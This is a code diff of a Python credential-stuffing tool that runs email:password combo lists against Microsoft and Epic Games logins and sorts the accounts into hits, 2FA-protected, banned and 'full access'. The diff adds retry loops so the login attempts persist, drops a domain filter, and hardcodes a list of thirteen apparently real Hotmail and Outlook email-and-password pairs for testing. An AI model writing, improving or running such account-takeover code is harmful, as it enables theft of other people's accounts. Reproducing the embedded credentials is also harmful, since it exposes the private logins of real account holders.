@@ -142,13 +142,18 @@ def check(line):
         "isRecoveryAttemptPost": "0",
         "i19": "21648"
     }
-    response = session.post(url, headers=headers, data=payload)
-    if 'Too Many Requests' in response.text:
-        toomany.append(line)
-        # print(f'{red}[SPAM] - {white}{line}{rescolor}')
-        spam += 1
-        checked += 1
-        return
+    while True:
+        try:
+            response = session.post(url, headers=headers, data=payload)
+            if 'Too Many Requests' in response.text:
+                toomany.append(line)
+                # print(f'{red}[SPAM] - {white}{line}{rescolor}')
+                spam += 1
+                return
+        except:
+            print('Line 155')
+            continue
+        break
 
     r = response
     failure_keywords = [
@@ -222,15 +227,19 @@ def check(line):
             "Upgrade-Insecure-Requests": "1",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
         }
-
-        response = session.post(url2, headers=headers, data=payload)
-        if 'id/oauth-authorized?code=' in response.url:
-            pass
-        else:
-            # print(f'{lgreen}[MS-HIT] - {white}{line}{rescolor}')
-            ms_hits += 1
-            checked +=1
-            return
+        while True:
+            try:
+                response = session.post(url2, headers=headers, data=payload)
+                if 'id/oauth-authorized?code=' in response.url:
+                    break
+                else:
+                    # print(f'{lgreen}[MS-HIT] - {white}{line}{rescolor}')
+                    ms_hits += 1
+                    checked +=1
+                    return
+            except:
+                print('Line 242')
+                continue
 
         parsed_url = urllib.parse.urlparse(response.url)
         query_params = urllib.parse.parse_qs(parsed_url.query)
@@ -258,7 +267,7 @@ def check(line):
         cookies.get('EPIC_SESSION_REPUTATION')
         cookies.get('EPIC_SESSION_AP')
         xsrf_token_cookie = cookies.get('XSRF-TOKEN')
-
+        
         url = "https://www.epicgames.com/id/api/external/xbl/login"
         payload = {
             "code": f'{code}'
@@ -285,7 +294,14 @@ def check(line):
             "Content-Length": "56"  
         }
 
-        response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies)
+        while True:
+            try:
+                response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies)
+                break
+            except:
+                print('Line 303')
+                continue
+
         if 'message":"Two-Factor authentication' in response.text :
             print(f'{blue}[2FA] - {white}{line}{rescolor}')
             if not os.path.exists(folder + '/2FA'):
@@ -293,6 +309,7 @@ def check(line):
             open(f'{folder}/2FA/all.txt', 'a',
             encoding='u8').write(f'{line}\n')
             checked += 1
+            return
         elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
             print(f'{red}[HEADLESS] - {white}{line}{rescolor}')
             checked +=1
@@ -394,6 +411,7 @@ def check(line):
                     url = response.headers['location']
                     break
             except:
+                print('Line 415')
                 continue
 
         headers = {
@@ -423,6 +441,7 @@ def check(line):
                     print(response.url)
                     break
             except:
+                print('Line 445')
                 continue
         
         while True:
@@ -605,7 +624,7 @@ def check(line):
                             response = scraper.post(url, headers=headers, json={}, cookies=response.cookies)
                             response_str = response.text
                             if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
-                                print(f'{lb}[FN-BAN] - {white}{line}')
+                                print(f'{red}[FN-BAN] - {white}{line}')
                                 checked += 1
                                 return
 
@@ -767,7 +786,7 @@ def check(line):
                             (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') +
                             f'[OG:{isOG}]' + 
                             f' - {white}{line}{rescolor}' + 
-                            (f' - {lgreen}[exclusiveSkins: ({len(exclusiveSkin)}) {[i for i in exclusiveSkin]}]' if len(exclusiveSkin) > 0 else '')
+                            (f' - {lgreen}[Exclusive Skins: ({len(exclusiveSkin)}) {[i for i in exclusiveSkin]}]' if len(exclusiveSkin) > 0 else '')
                             )
 
                             fullAccess = 'NFA'
@@ -872,6 +891,9 @@ def banner():
 {lgreen}╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 ''')
 
+accs_test = ['jcal1999@hotmail.com:Joni-cris1', 'aparecida772014@hotmail.com:Felicidade28', 'assire1052@hotmail.com:Spaceman1052.', 'doghog42@outlook.com:justpray25', 'elsomacedo@outlook.com.br:Qpwo0910#',
+        'javier-oliver@hotmail.com:internet1989', 'kelvin.a.azevedo@hotmail.com:Kelvin94159@', 'genaro.castillo.gcc22@hotmail.com:Castillo9898%', 'camila_peruchi@hotmail.com:Camila.20', 
+        'juniorharper07@outlook.com:P2b6p7b8', 'alberthmuniz20@hotmail.com:23031996Al1996@@', 'duncmaybury@hotmail.com:Rupert2009', 'mxdzfn@outlook.com:fortniteaccount1234']
 
 threads  = []
 threads2 = []
@@ -889,12 +911,10 @@ def main():
             total_lines = len(clean_accs)
             print(f'Loaded Combo: {total_lines}\n{rescolor}')
             for acc in clean_accs:
-                clean_accs.remove(acc)
-                if check_domain(acc):
-                    th = Thread(target=check, args=(acc,))
-                    threads.append(th)
-                    time.sleep(0.002)
-                    th.start()
+                th = Thread(target=check, args=(acc,))
+                threads.append(th)
+                time.sleep(0.002)
+                th.start()
             for th in threads:
                 th.join()
         
